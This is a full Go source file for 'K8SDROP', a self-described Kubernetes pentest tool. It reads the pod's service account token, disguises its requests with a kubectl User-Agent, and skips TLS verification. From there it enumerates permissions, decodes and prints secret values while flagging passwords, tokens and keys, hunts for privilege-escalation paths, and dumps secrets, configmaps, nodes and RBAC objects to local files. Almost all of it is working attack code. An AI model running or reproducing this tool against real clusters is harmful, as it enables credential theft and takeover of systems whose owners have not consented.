package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

const VERSION = "1.0.0"

type K8sClient struct {
	Token      string
	APIServer  string
	HTTPClient *http.Client
	Namespace  string
}

type Config struct {
	Mode       string
	Namespace  string
	Resource   string
	Output     string
	Verbose    bool
	AutoDetect bool
	UserAgent  string
}

// Color codes for output
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorPurple = "\033[35m"
	ColorCyan   = "\033[36m"
)

func main() {
	cfg := parseFlags()
	
	if cfg.Mode == "help" {
		printUsage()
		os.Exit(0)
	}

	client := initClient(cfg)
	
	if client == nil {
		printError("Failed to initialize Kubernetes client")
		os.Exit(1)
	}

	printBanner()
	
	switch cfg.Mode {
	case "recon":
		runRecon(client, cfg)
	case "secrets":
		extractSecrets(client, cfg)
	case "rbac":
		analyzeRBAC(client, cfg)
	case "pods":
		analyzePods(client, cfg)
	case "exec":
		execInPod(client, cfg)
	case "privesc":
		checkPrivilegeEscalation(client, cfg)
	case "dump":
		dumpAll(client, cfg)
	case "interactive":
		interactiveMode(client, cfg)
	default:
		printError("Unknown mode: " + cfg.Mode)
		printUsage()
		os.Exit(1)
	}
}

func parseFlags() Config {
	cfg := Config{}
	
	flag.StringVar(&cfg.Mode, "mode", "recon", "Operation mode: recon, secrets, rbac, pods, exec, privesc, dump, interactive")
	flag.StringVar(&cfg.Namespace, "namespace", "", "Target namespace (empty for all)")
	flag.StringVar(&cfg.Resource, "resource", "", "Specific resource name")
	flag.StringVar(&cfg.Output, "output", "text", "Output format: text, json, yaml")
	flag.BoolVar(&cfg.Verbose, "verbose", false, "Verbose output")
	flag.BoolVar(&cfg.AutoDetect, "auto", true, "Auto-detect token and API server")
	flag.StringVar(&cfg.UserAgent, "ua", "kubectl/v1.28.0", "User-Agent header")
	
	flag.Parse()
	
	return cfg
}

func initClient(cfg Config) *K8sClient {
	client := &K8sClient{
		HTTPClient: &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
	}

	if cfg.AutoDetect {
		// Try to read ServiceAccount token
		tokenBytes, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
		if err == nil {
			client.Token = string(tokenBytes)
			if cfg.Verbose {
				printInfo("Token loaded from ServiceAccount")
			}
		} else {
			// Try environment variable
			client.Token = os.Getenv("K8S_TOKEN")
		}

		// Read namespace
		nsBytes, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
		if err == nil {
			client.Namespace = string(nsBytes)
		} else {
			client.Namespace = "default"
		}

		// Detect API server
		if host := os.Getenv("KUBERNETES_SERVICE_HOST"); host != "" {
			port := os.Getenv("KUBERNETES_SERVICE_PORT")
			if port == "" {
				port = "443"
			}
			client.APIServer = fmt.Sprintf("https://%s:%s", host, port)
		} else {
			client.APIServer = "https://kubernetes.default.svc.cluster.local"
		}
	}

	if client.Token == "" {
		printWarning("No token found. Use -auto=false and set K8S_TOKEN environment variable")
		return nil
	}

	if cfg.Verbose {
		printInfo(fmt.Sprintf("API Server: %s", client.APIServer))
		printInfo(fmt.Sprintf("Namespace: %s", client.Namespace))
		printInfo(fmt.Sprintf("Token: %s...", client.Token[:20]))
	}

	return client
}

func (c *K8sClient) makeRequest(method, path string, body []byte) ([]byte, error) {
	url := c.APIServer + path
	
	req, err := http.NewRequest(method, url, bytes.NewBuffer(body))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Authorization", "Bearer "+c.Token)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "kubectl/v1.28.0")

	resp, err := c.HTTPClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode >= 400 {
		return respBody, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(respBody))
	}

	return respBody, nil
}

func runRecon(client *K8sClient, cfg Config) {
	printSection("RECONNAISSANCE")

	// Version
	printSubSection("Cluster Version")
	data, err := client.makeRequest("GET", "/version", nil)
	if err == nil {
		var version map[string]interface{}
		json.Unmarshal(data, &version)
		printSuccess(fmt.Sprintf("Kubernetes Version: %v", version["gitVersion"]))
		printInfo(fmt.Sprintf("Platform: %v", version["platform"]))
	} else {
		printError("Failed to get version: " + err.Error())
	}

	// API Groups
	printSubSection("API Groups")
	data, err = client.makeRequest("GET", "/apis", nil)
	if err == nil {
		var apiGroups map[string]interface{}
		json.Unmarshal(data, &apiGroups)
		if groups, ok := apiGroups["groups"].([]interface{}); ok {
			printSuccess(fmt.Sprintf("Found %d API groups", len(groups)))
			for _, g := range groups {
				if group, ok := g.(map[string]interface{}); ok {
					fmt.Printf("  • %s\n", group["name"])
				}
			}
		}
	}

	// Namespaces
	printSubSection("Namespaces")
	data, err = client.makeRequest("GET", "/api/v1/namespaces", nil)
	if err == nil {
		var result map[string]interface{}
		json.Unmarshal(data, &result)
		if items, ok := result["items"].([]interface{}); ok {
			printSuccess(fmt.Sprintf("Found %d namespaces", len(items)))
			for _, item := range items {
				if ns, ok := item.(map[string]interface{}); ok {
					if metadata, ok := ns["metadata"].(map[string]interface{}); ok {
						fmt.Printf("  • %s\n", metadata["name"])
					}
				}
			}
		}
	} else {
		printWarning("Cannot list namespaces: " + err.Error())
	}

	// Self-assessment
	printSubSection("Permission Assessment")
	checkPermission(client, "*", "*", "*")
	checkPermission(client, "list", "secrets", "")
	checkPermission(client, "list", "pods", "")
	checkPermission(client, "create", "pods/exec", "")
	checkPermission(client, "get", "nodes", "")
}

func checkPermission(client *K8sClient, verb, resource, apiGroup string) {
	payload := map[string]interface{}{
		"apiVersion": "authorization.k8s.io/v1",
		"kind":       "SelfSubjectAccessReview",
		"spec": map[string]interface{}{
			"resourceAttributes": map[string]interface{}{
				"verb":     verb,
				"resource": resource,
				"group":    apiGroup,
			},
		},
	}

	data, _ := json.Marshal(payload)
	resp, err := client.makeRequest("POST", "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", data)
	
	if err == nil {
		var result map[string]interface{}
		json.Unmarshal(resp, &result)
		if status, ok := result["status"].(map[string]interface{}); ok {
			if allowed, ok := status["allowed"].(bool); ok && allowed {
				printSuccess(fmt.Sprintf("✓ Can %s %s", verb, resource))
			} else {
				printWarning(fmt.Sprintf("✗ Cannot %s %s", verb, resource))
			}
		}
	}
}

func extractSecrets(client *K8sClient, cfg Config) {
	printSection("SECRET EXTRACTION")

	namespaces := []string{}
	if cfg.Namespace != "" {
		namespaces = append(namespaces, cfg.Namespace)
	} else {
		// Get all namespaces
		data, err := client.makeRequest("GET", "/api/v1/namespaces", nil)
		if err != nil {
			printError("Cannot list namespaces: " + err.Error())
			return
		}
		var result map[string]interface{}
		json.Unmarshal(data, &result)
		if items, ok := result["items"].([]interface{}); ok {
			for _, item := range items {
				if ns, ok := item.(map[string]interface{}); ok {
					if metadata, ok := ns["metadata"].(map[string]interface{}); ok {
						namespaces = append(namespaces, metadata["name"].(string))
					}
				}
			}
		}
	}

	totalSecrets := 0
	for _, ns := range namespaces {
		printSubSection(fmt.Sprintf("Namespace: %s", ns))
		
		path := fmt.Sprintf("/api/v1/namespaces/%s/secrets", ns)
		data, err := client.makeRequest("GET", path, nil)
		if err != nil {
			printWarning(fmt.Sprintf("Cannot access secrets in %s: %s", ns, err.Error()))
			continue
		}

		var result map[string]interface{}
		json.Unmarshal(data, &result)
		if items, ok := result["items"].([]interface{}); ok {
			for _, item := range items {
				if secret, ok := item.(map[string]interface{}); ok {
					metadata := secret["metadata"].(map[string]interface{})
					name := metadata["name"].(string)
					secretType := secret["type"].(string)
					
					printInfo(fmt.Sprintf("Secret: %s (Type: %s)", name, secretType))
					
					if secretData, ok := secret["data"].(map[string]interface{}); ok {
						for key, val := range secretData {
							if valStr, ok := val.(string); ok {
								decoded, err := base64.StdEncoding.DecodeString(valStr)
								if err == nil {
									// Print first 50 chars
									preview := string(decoded)
									if len(preview) > 50 {
										preview = preview[:50] + "..."
									}
									fmt.Printf("  %s: %s\n", key, preview)
									
									// Check for credentials
									if strings.Contains(strings.ToLower(key), "password") ||
									   strings.Contains(strings.ToLower(key), "token") ||
									   strings.Contains(strings.ToLower(key), "key") {
										printSuccess(fmt.Sprintf("    [!] Potential credential: %s", key))
									}
								}
							}
						}
					}
					totalSecrets++
				}
			}
		}
	}

	printSuccess(fmt.Sprintf("\nTotal secrets found: %d", totalSecrets))
}

func analyzeRBAC(client *K8sClient, cfg Config) {
	printSection("RBAC ANALYSIS")

	// ClusterRoles
	printSubSection("ClusterRoles with Dangerous Permissions")
	data, err := client.makeRequest("GET", "/apis/rbac.authorization.k8s.io/v1/clusterroles", nil)
	if err != nil {
		printError("Cannot list ClusterRoles: " + err.Error())
		return
	}

	var result map[string]interface{}
	json.Unmarshal(data, &result)
	if items, ok := result["items"].([]interface{}); ok {
		for _, item := range items {
			if role, ok := item.(map[string]interface{}); ok {
				metadata := role["metadata"].(map[string]interface{})
				name := metadata["name"].(string)
				
				if rules, ok := role["rules"].([]interface{}); ok {
					dangerous := false
					for _, rule := range rules {
						if r, ok := rule.(map[string]interface{}); ok {
							verbs := r["verbs"].([]interface{})
							resources := r["resources"].([]interface{})
							
							for _, v := range verbs {
								if v == "*" {
									dangerous = true
									break
								}
							}
							for _, res := range resources {
								if res == "*" || res == "secrets" {
									dangerous = true
									break
								}
							}
						}
					}
					
					if dangerous {
						printWarning(fmt.Sprintf("Dangerous ClusterRole: %s", name))
					}
				}
			}
		}
	}

	// ClusterRoleBindings
	printSubSection("ClusterRoleBindings to Admin Roles")
	data, err = client.makeRequest("GET", "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings", nil)
	if err != nil {
		printError("Cannot list ClusterRoleBindings: " + err.Error())
		return
	}

	json.Unmarshal(data, &result)
	if items, ok := result["items"].([]interface{}); ok {
		for _, item := range items {
			if binding, ok := item.(map[string]interface{}); ok {
				metadata := binding["metadata"].(map[string]interface{})
				name := metadata["name"].(string)
				
				if roleRef, ok := binding["roleRef"].(map[string]interface{}); ok {
					roleName := roleRef["name"].(string)
					if roleName == "cluster-admin" || roleName == "admin" {
						printSuccess(fmt.Sprintf("High-privilege binding: %s -> %s", name, roleName))
						
						if subjects, ok := binding["subjects"].([]interface{}); ok {
							for _, subj := range subjects {
								if s, ok := subj.(map[string]interface{}); ok {
									fmt.Printf("  Subject: %s/%s\n", s["kind"], s["name"])
								}
							}
						}
					}
				}
			}
		}
	}
}

func analyzePods(client *K8sClient, cfg Config) {
	printSection("POD ANALYSIS")

	printSubSection("Privileged Pods")
	path := "/api/v1/pods"
	if cfg.Namespace != "" {
		path = fmt.Sprintf("/api/v1/namespaces/%s/pods", cfg.Namespace)
	}

	data, err := client.makeRequest("GET", path, nil)
	if err != nil {
		printError("Cannot list pods: " + err.Error())
		return
	}

	var result map[string]interface{}
	json.Unmarshal(data, &result)
	if items, ok := result["items"].([]interface{}); ok {
		for _, item := range items {
			if pod, ok := item.(map[string]interface{}); ok {
				metadata := pod["metadata"].(map[string]interface{})
				name := metadata["name"].(string)
				ns := metadata["namespace"].(string)
				
				spec := pod["spec"].(map[string]interface{})
				
				// Check for privilege escalation vectors
				privileged := false
				reasons := []string{}
				
				if hostNetwork, ok := spec["hostNetwork"].(bool); ok && hostNetwork {
					privileged = true
					reasons = append(reasons, "hostNetwork")
				}
				if hostPID, ok := spec["hostPID"].(bool); ok && hostPID {
					privileged = true
					reasons = append(reasons, "hostPID")
				}
				if hostIPC, ok := spec["hostIPC"].(bool); ok && hostIPC {
					privileged = true
					reasons = append(reasons, "hostIPC")
				}
				
				// Check containers
				if containers, ok := spec["containers"].([]interface{}); ok {
					for _, container := range containers {
						if c, ok := container.(map[string]interface{}); ok {
							if secCtx, ok := c["securityContext"].(map[string]interface{}); ok {
								if priv, ok := secCtx["privileged"].(bool); ok && priv {
									privileged = true
									reasons = append(reasons, "privileged container")
								}
							}
						}
					}
				}
				
				if privileged {
					printWarning(fmt.Sprintf("Pod: %s/%s", ns, name))
					printError(fmt.Sprintf("  Reasons: %s", strings.Join(reasons, ", ")))
				}
			}
		}
	}
}

func checkPrivilegeEscalation(client *K8sClient, cfg Config) {
	printSection("PRIVILEGE ESCALATION CHECKS")

	checks := []struct {
		name        string
		description string
		check       func(*K8sClient) bool
	}{
		{
			"Can impersonate users",
			"Check if current token can impersonate other users",
			func(c *K8sClient) bool {
				payload := map[string]interface{}{
					"apiVersion": "authorization.k8s.io/v1",
					"kind":       "SelfSubjectAccessReview",
					"spec": map[string]interface{}{
						"resourceAttributes": map[string]interface{}{
							"verb":     "impersonate",
							"resource": "users",
						},
					},
				}
				data, _ := json.Marshal(payload)
				resp, err := c.makeRequest("POST", "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", data)
				if err != nil {
					return false
				}
				var result map[string]interface{}
				json.Unmarshal(resp, &result)
				if status, ok := result["status"].(map[string]interface{}); ok {
					if allowed, ok := status["allowed"].(bool); ok {
						return allowed
					}
				}
				return false
			},
		},
		{
			"Can create pods/exec",
			"Check if current token can exec into pods",
			func(c *K8sClient) bool {
				payload := map[string]interface{}{
					"apiVersion": "authorization.k8s.io/v1",
					"kind":       "SelfSubjectAccessReview",
					"spec": map[string]interface{}{
						"resourceAttributes": map[string]interface{}{
							"verb":        "create",
							"resource":    "pods",
							"subresource": "exec",
						},
					},
				}
				data, _ := json.Marshal(payload)
				resp, err := c.makeRequest("POST", "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", data)
				if err != nil {
					return false
				}
				var result map[string]interface{}
				json.Unmarshal(resp, &result)
				if status, ok := result["status"].(map[string]interface{}); ok {
					if allowed, ok := status["allowed"].(bool); ok {
						return allowed
					}
				}
				return false
			},
		},
		{
			"Can create pods",
			"Check if current token can create new pods",
			func(c *K8sClient) bool {
				payload := map[string]interface{}{
					"apiVersion": "authorization.k8s.io/v1",
					"kind":       "SelfSubjectAccessReview",
					"spec": map[string]interface{}{
						"resourceAttributes": map[string]interface{}{
							"verb":     "create",
							"resource": "pods",
						},
					},
				}
				data, _ := json.Marshal(payload)
				resp, err := c.makeRequest("POST", "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", data)
				if err != nil {
					return false
				}
				var result map[string]interface{}
				json.Unmarshal(resp, &result)
				if status, ok := result["status"].(map[string]interface{}); ok {
					if allowed, ok := status["allowed"].(bool); ok {
						return allowed
					}
				}
				return false
			},
		},
	}

	for _, check := range checks {
		fmt.Printf("[*] %s... ", check.name)
		if check.check(client) {
			printSuccess("✓ VULNERABLE")
			printInfo(fmt.Sprintf("    %s", check.description))
		} else {
			fmt.Println("✗ Not vulnerable")
		}
	}
}

func dumpAll(client *K8sClient, cfg Config) {
	printSection("FULL CLUSTER DUMP")
	
	printInfo("Starting comprehensive dump...")
	
	// Create output directory
	outputDir := fmt.Sprintf("k8s-dump-%d", time.Now().Unix())
	os.MkdirAll(outputDir, 0755)
	
	printInfo(fmt.Sprintf("Output directory: %s", outputDir))
	
	// Dump various resources
	resources := []struct {
		name string
		path string
	}{
		{"version", "/version"},
		{"namespaces", "/api/v1/namespaces"},
		{"secrets", "/api/v1/secrets"},
		{"configmaps", "/api/v1/configmaps"},
		{"pods", "/api/v1/pods"},
		{"services", "/api/v1/services"},
		{"serviceaccounts", "/api/v1/serviceaccounts"},
		{"clusterroles", "/apis/rbac.authorization.k8s.io/v1/clusterroles"},
		{"clusterrolebindings", "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings"},
		{"nodes", "/api/v1/nodes"},
	}

	for _, res := range resources {
		printInfo(fmt.Sprintf("Dumping %s...", res.name))
		data, err := client.makeRequest("GET", res.path, nil)
		if err != nil {
			printWarning(fmt.Sprintf("Failed to dump %s: %s", res.name, err.Error()))
			continue
		}
		
		filename := fmt.Sprintf("%s/%s.json", outputDir, res.name)
		os.WriteFile(filename, data, 0644)
		printSuccess(fmt.Sprintf("Saved to %s", filename))
	}

	printSuccess(fmt.Sprintf("\nDump complete! Files saved to %s", outputDir))
}

func execInPod(client *K8sClient, cfg Config) {
	printError("Pod exec requires websocket/SPDY support - use kubectl instead")
	printInfo("Example: kubectl exec -it <pod> -n <namespace> -- /bin/bash")
}

func interactiveMode(client *K8sClient, cfg Config) {
	printSection("INTERACTIVE MODE")
	printInfo("Type 'help' for commands, 'exit' to quit\n")

	for {
		fmt.Print(ColorCyan + "k8sdrop> " + ColorReset)
		var input string
		fmt.Scanln(&input)
		
		switch strings.TrimSpace(input) {
		case "exit", "quit":
			printInfo("Exiting...")
			return
		case "help":
			printInteractiveHelp()
		case "recon":
			runRecon(client, cfg)
		case "secrets":
			extractSecrets(client, cfg)
		case "rbac":
			analyzeRBAC(client, cfg)
		case "pods":
			analyzePods(client, cfg)
		case "privesc":
			checkPrivilegeEscalation(client, cfg)
		case "dump":
			dumpAll(client, cfg)
		default:
			printWarning("Unknown command. Type 'help' for available commands.")
		}
	}
}

func printInteractiveHelp() {
	fmt.Println("\nAvailable commands:")
	fmt.Println("  recon    - Reconnaissance and enumeration")
	fmt.Println("  secrets  - Extract secrets from cluster")
	fmt.Println("  rbac     - Analyze RBAC permissions")
	fmt.Println("  pods     - Analyze pod configurations")
	fmt.Println("  privesc  - Check privilege escalation paths")
	fmt.Println("  dump     - Dump all accessible resources")
	fmt.Println("  help     - Show this help")
	fmt.Println("  exit     - Exit interactive mode")
	fmt.Println()
}

// Utility functions
func printBanner() {
	banner := `
╔═══════════════════════════════════════╗
║        K8SDROP - K8s Pentest Tool     ║
║              Version ` + VERSION + `             ║
╚═══════════════════════════════════════╝
`
	fmt.Println(ColorPurple + banner + ColorReset)
}

func printSection(title string) {
	fmt.Println("\n" + ColorBlue + "═══ " + title + " ═══" + ColorReset)
}

func printSubSection(title string) {
	fmt.Println("\n" + ColorCyan + "─── " + title + " ───" + ColorReset)
}

func printSuccess(msg string) {
	fmt.Println(ColorGreen + "[+] " + msg + ColorReset)
}

func printInfo(msg string) {
	fmt.Println(ColorBlue + "[*] " + msg + ColorReset)
}

func printWarning(msg string) {
	fmt.Println(ColorYellow + "[!] " + msg + ColorReset)
}

func printError(msg string) {
	fmt.Println(ColorRed + "[✗] " + msg + ColorReset)
}

func printUsage() {
	usage := `
Usage: k8sdrop [options]

Modes:
  recon        - Reconnaissance and initial enumeration
  secrets      - Extract secrets from cluster
  rbac         - Analyze RBAC permissions
  pods         - Analyze pod configurations
  privesc      - Check privilege escalation vectors
  dump         - Dump all accessible resources
  interactive  - Interactive mode

Options:
  -mode        Operation mode (default: recon)
  -namespace   Target namespace (empty for all)
  -resource    Specific resource name
  -output      Output format: text, json (default: text)
  -verbose     Verbose output
  -auto        Auto-detect token and API server (default: true)
  -ua          User-Agent header (default: kubectl/v1.28.0)

Examples:
  # Basic reconnaissance
  k8sdrop -mode recon

  # Extract secrets from specific namespace
  k8sdrop -mode secrets -namespace kube-system

  # Dump everything
  k8sdrop -mode dump

  # Interactive mode
  k8sdrop -mode interactive
`
	fmt.Println(usage)
}
